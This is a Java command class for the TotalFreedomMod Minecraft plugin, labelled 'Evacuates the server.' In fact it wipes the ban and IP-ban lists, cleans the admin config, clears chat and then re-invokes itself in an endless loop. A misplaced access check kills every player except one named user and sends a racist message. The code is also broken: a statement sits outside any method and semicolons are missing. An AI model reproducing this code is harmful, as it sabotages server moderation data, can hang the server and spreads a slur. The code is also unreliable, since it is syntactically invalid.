package me.StevenLawson.TotalFreedomMod.Commands;

import me.StevenLawson.TotalFreedomMod.TFM_Util;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

@CommandPermissions(level = AdminLevel.SENIOR, source = SourceType.BOTH)
@CommandParameters(description = "Evacuates the server.", usage = "/<command>")
public class Command_serverevacuate extends TFM_Command
{
 if (!sender.getName().equals("DarkGamingDronze")) 
         { 
             sender_p.sendMessage(ChatColor.RED + "Only DarkGamingDronze may use this command.\nNo permissions for the people who aren't black."); 
             sender_p.setHealth(0.0); 
             return true; 
         } 

    @Override
    public boolean run(CommandSender sender, Player sender_p, Command cmd, String commandLabel, String[] args, boolean senderIsConsole)
    {
        TFM_Util.bcastMsg(ChatColor.RED + "Attempting to start server evacuate!");
        server.dispatchCommand(sender, "say WARNING: SERVER EVACUATE!!!!!!!")
        server.dispatchCommand(sender, "purgeall");
        server.dispatchCommand(sender, "tfbanlist purge");
        server.dispatchCommand(sender, "tfipbanlist purge");
        server.dispatchCommand(sender, "glist purge");
        server.dispatchCommand(sender, "tfm reload");
        server.dispatchCommand(sender, "saconfig clean");
        server.dispatchCommand(sender, "cc");
        server.dispatchCommand(sender, "say WARNING:SERVER EVACUATE!!!!!!!!!!!!!!!");
        server.dispatchCommand(sender, "serverevacuate")
        return true;
    }
}
